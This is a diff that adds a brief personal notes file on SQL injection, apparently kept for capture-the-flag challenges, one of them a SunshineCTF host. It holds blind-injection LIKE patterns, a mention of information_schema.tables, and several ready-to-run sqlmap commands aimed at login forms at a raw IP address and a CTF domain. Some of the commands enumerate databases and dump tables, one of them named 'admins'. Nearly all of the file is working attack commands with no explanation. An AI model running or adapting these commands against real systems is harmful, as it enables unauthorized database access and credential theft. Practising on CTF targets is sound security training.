@@ -1,0 +1,16 @@
+SQLi:
+    blind sql:
+        or <something> LIKE "%x%"
+        or <something> LIKE "____"
+    information_schema.tables
+
+    sqlmap:
+        sqlmap -u http://35.237.57.141:5001/352b4bc136/login --method POST --data "username=FUZZ&password=" -p username --dbs --dbms mysql --regexp "invalid password" --level 2
+
+         sqlmap -u http://35.237.57.141:5001/352b4bc136/login --method POST --data "username=FUZZ&password=" -p username --table -D level2 --dbms mysql --regexp "invalid password" --level 2
+
+          sqlmap -u http://35.237.57.141:5001/352b4bc136/login --method POST --data "username=FUZZ&password=" -p username --dump -D level2 -T admins --dbms mysql --regexp "invalid password" --level 2
+
+          sqlmap -u http://35.237.57.141:5001/352b4bc136/login --method POST --data "username=FUZZ&password=" -p username --dump -D level2 -T pages --dbms mysql --regexp "invalid password" --level 2
+
+sqlmap -u http://bk.sunshinectf.org/login.php --method POST --data "username=a&passwordb=" -p username --dbms=sqlite -D users --columns --dump --not-string "invalid" --level 2
